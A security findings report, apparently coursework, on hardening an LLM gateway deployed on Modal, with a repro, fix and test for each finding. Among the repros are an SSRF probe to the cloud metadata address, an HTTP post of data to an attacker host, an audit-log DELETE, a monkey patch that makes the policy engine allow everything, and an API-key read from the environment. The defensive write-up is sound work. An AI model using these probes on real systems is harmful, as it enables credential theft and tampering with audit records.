# Part 1 Findings — glc_v2 Modal Hardening

Source: Session 12 lecture §§4, 6, 7, 15–16. Work lives in this clone.

**Eight invariants (vocabulary):**

1. Adapters must never see provider API keys  
2. Every action must be checked against the actual user, tenant, and final arguments  
3. External content must always be treated as data, never as instructions  
4. A credential must work only for one specific tool call  
5. Each tenant must have separate memory, and every stored fact must record its source  
6. Dangerous or high-impact actions must be approved with their final parameters  
7. Components must not be able to edit or delete their own audit logs  
8. Every run must have hard limits on time, tokens, tool calls, and cost  

Attacker roles (weak → strong): outsider → channel user → adapter-container attacker → in-gateway code execution.

---

## How to test (local + Modal)

```bash
# Local
uv sync
uv run pytest tests/test_part1_hardening.py tests/test_v9_compat.py -q

# Token for curl (after one boot, or read from config dir)
uv run glc token   # or: cat $GLC_CONFIG_DIR/install_token

# Modal (mock secret already created)
uv run modal deploy modal_app.py
# Then set BASE=<your Modal URL>
export TOKEN=$(uv run python -c "from glc.config import get_or_create_install_token; print(get_or_create_install_token())")
# On Modal the token is on the Volume under /data/glc/install_token — fetch via a one-off
# `modal run` helper or read from the first authenticated control presence after create.
```

On a fresh Modal deploy, create the token by starting the app once, then read it:

```bash
uv run modal volume get glc-data glc/install_token - > install_token.txt
export TOKEN=$(cat install_token.txt)
export BASE=https://<your-modal-url>
```

---

## Group A — Introduced / elevated by migration

| ID | Finding | Invariant | Attacker | Repro (before) | Fix | Repro (after / how to test) |
|----|---------|-----------|----------|----------------|-----|------------------------------|
| **A1** | Public data plane, no auth (`/v1/chat`, batch, embed, vision, speak, transcribe) | 2, 8 | outsider | `curl -X POST $BASE/v1/chat -H 'content-type: application/json' -d '{"prompt":"hi"}'` → provider error, not 401 | `DataPlaneAuthMiddleware` requires `Authorization: Bearer <install_token>` | Same curl → **401**. With `-H "Authorization: Bearer $TOKEN"` → proceeds (then provider/auth logic). |
| **A2** | Unauth info disclosure (`/v1/status`, `/providers`, `/capabilities`, `/cost/by_agent`, `/calls`, `/docs`, `/openapi.json`) | 2 | outsider | `curl $BASE/v1/status` etc. returned inventory | Same bearer gate; docs/OpenAPI disabled when `GLC_ENV=production` / Modal (`docs_enabled()`) | Unauth `curl` → **401**. On Modal, `/docs` and `/openapi.json` are absent. Locally with `GLC_ENABLE_DOCS=1`, docs still need the bearer. |
| **A3** | Single Function = no egress wall (= leak 6) | 1 / 8 | adapter / in-gateway | Chat error showed reach to `googleapis.com`; in-process `httpx` to attacker host worked | `assert_egress_allowed()` + default allowlist for provider hosts; untrusted code should call it before outbound HTTP. Full Sandbox wall is follow-on. | `pytest` `test_leak6_egress_allowlist_blocks_attacker`. Adapter that skips the helper is still a gap until Sandboxes land. |
| **A4** | One Secret for whole Function (= leak 1) | 1 | adapter-container / in-gateway | `os.environ["GEMINI_API_KEY"]` after boot | After `build_providers` / embedders, `scrub_provider_keys_from_environ()` vaults keys; channel modules cannot call `provider_key()` | Boot app with mock key set → key gone from `os.environ`. `test_leak1_environ_scrub_removes_provider_keys`. |
| **A5** | Non-reproducible image (`debian_slim` + `>=` deps) | supply-chain / 1 | outsider (build) | Image ignored `uv.lock` | `modal_app.py` installs from `requirements-modal.txt` (`uv export --frozen`) | Inspect `modal_app.py` + regenerate: `uv export --frozen --no-dev --no-emit-project --no-hashes -o requirements-modal.txt`. |
| **A6** | Audit DB on Volume + autoscaling → concurrent SQLite writers | 7 | environment | Scale >1 container races SQLite | `max_containers=1` on the Modal Function | Confirm deploy config: `max_containers=1` in `modal_app.py`. |

---

## Group C — Inherited endpoints, now internet-reachable

| ID | Finding | Invariant | Attacker | Repro (before) | Fix | How to test |
|----|---------|-----------|----------|----------------|-----|-------------|
| **C1** | SSRF via `/v1/vision` / `_resolve_image_urls` | 2 | outsider (with token after A1) / channel user chain | Point image URL at private IP / metadata with `follow_redirects=True` | `glc/security/ssrf.py`: block private/link-local/loopback, metadata hosts; manual redirects with re-validate | `validate_fetch_url("http://127.0.0.1/")` raises. Authed `POST /v1/vision` with `image: http://169.254.169.254/` → **400** `"failed to fetch image url"`. Use only **your** webhook for live redirect tests. |
| **C2** | Cross-channel envelope spoof (= leak 9) | 2 | adapter | WS `/v1/channels/telegram` + envelope `channel=discord` accepted | Reject when `env.channel != name`; close socket; audit `channel_spoof_rejected` | `test_c2_channel_spoof_rejected` or WS send mismatched envelope → error + close. |
| **C3** | WS `?token=` in query string | 4 | outsider (log scraper) | Connect with `?token=` | Header-only `Authorization: Bearer`; query ignored | Connect with `?token=` only → close **1008**. Connect with header → OK. Bridges updated. |
| **C4** | Verbose upstream errors on `/v1/chat` | 1 (disclosure) | outsider | Response contained provider names/endpoints/exception text | Generic `upstream provider failed` / `all providers unavailable`; detail in server logs | Authed chat with mock keys → body has no `googleapis` / traceback (`test_c4_chat_errors_are_generic`). |
| **C5** | No rate limits / budget on data plane | 8 | outsider | Flood `/v1/chat` | `DataPlaneLimiter` RPM + daily token/cost caps; successful calls call `record_usage()` so budgets accumulate | Set `GLC_DATA_PLANE_RPM=2`, burst 3 POSTs → third **429**. Set `GLC_DATA_PLANE_MAX_TOKENS_DAY` low and complete successful calls → later **429** with token budget message. |
| **C6** | Pairing-code brute force | 2 | outsider with leaked install token | Rapid `/v1/control/pair/confirm` guesses | `PairingConfirmLimiter` (default 10/min) | Loop confirm with bad codes → **429** after limit. |

---

## Section 7 — Ten code leaks

| Leak | Shape | Invariant | Attacker | Fix | How to test |
|------|-------|-----------|----------|-----|-------------|
| **1** | `os.environ["GEMINI_API_KEY"]` | 1 | adapter / in-gateway | Vault + scrub after trusted constructors; `provider_key()` denies `glc.channels.*` | Set key, call `vault_provider_keys()`, assert missing from environ. |
| **2** | `DELETE FROM audit_log` | 7 | in-gateway | SQLite `BEFORE DELETE/UPDATE` triggers on `audit_log` | `test_leak2_audit_delete_blocked` — DELETE raises, row remains. |
| **3** | `force_pair_owner(...)` | 2 | in-gateway | Requires `GLC_ALLOW_FORCE_PAIR=1` + gateway role | Unset flag → `PermissionError` (`test_leak3_force_pair_requires_flag`). |
| **4** | Read `install_token` file; call control APIs | 4 | adapter | `GLC_COMPONENT_ROLE=adapter` cannot call `get_or_create_install_token()` | `GLC_COMPONENT_ROLE=adapter` → `PermissionError` on token read. Remote kill still loopback-only. |
| **5** | `glc.policy.engine.evaluate = lambda… allow` | 2 / 6 | in-gateway | `safe_evaluate()` denies if module `evaluate` was rebound | `test_leak5_safe_evaluate_detects_monkey_patch`. Dispatch paths should use `safe_evaluate`. |
| **6** | `httpx.post("https://attacker…")` | 1 / 8 | adapter | `assert_egress_allowed(url)` allowlist | Attacker host raises `PermissionError`. True Modal Sandbox egress is next isolation move. |
| **7** | `subprocess` / whisper-cli / `say` | process isolation | adapter / in-gateway | Subprocess off unless `GLC_ALLOW_SUBPROCESS=1` and binary allowlisted | Default Modal env has subprocess off; whisper raises RuntimeError. |
| **8** | `os.kill(os.getpid(), SIGTERM)` | availability | in-gateway | PID namespace requires separate adapter Sandbox/Function (documented). Remote kill remains loopback-gated. | In-process kill in a shared process cannot be fully blocked in Python; architectural fix is Process/PID isolation. Confirm `/v1/control/kill` from non-loopback → **403**. |
| **9** | Envelope `channel=discord` over WS `/telegram` | 2 | adapter | Same as **C2** | Same as C2. |
| **10** | `glc.db.log_call(... huge tokens ...)` | 7 / 8 | in-gateway | Hard caps on token counts; gateway role; signature required outside `glc.routes` | `test_leak10_log_call_rejects_huge_tokens`. |

---

## Fix clusters (where the code lives)

1. **Auth + docs + limits:** `glc/security/auth.py`, `glc/security/data_plane_limits.py`, `glc/main.py`  
2. **Endpoint logic:** `glc/security/ssrf.py`, `glc/routes/channels.py`, `glc/routes/chat.py`, `glc/routes/control.py`  
3. **Isolation:** `glc/security/isolation.py`, `glc/audit/store.py`, `glc/security/pairing.py`, `glc/config.py`, `glc/db.py`, `glc/policy/engine.py`, whisper/TTS wrappers  
4. **Deploy hygiene:** `modal_app.py`, `requirements-modal.txt` (`max_containers=1`, locked deps, prod env)

---

## Remaining architectural debt (honest)

Move 1 still runs one Function. Leaks **6** and **8** are only fully closed when adapters run in separate Modal Sandboxes/Functions with their own Secrets, egress allowlists, and PID namespaces. This clone adds the application-layer walls and deploy constraints that make the classic Section 6/7 repros **fail** for the required Part 1 floor.
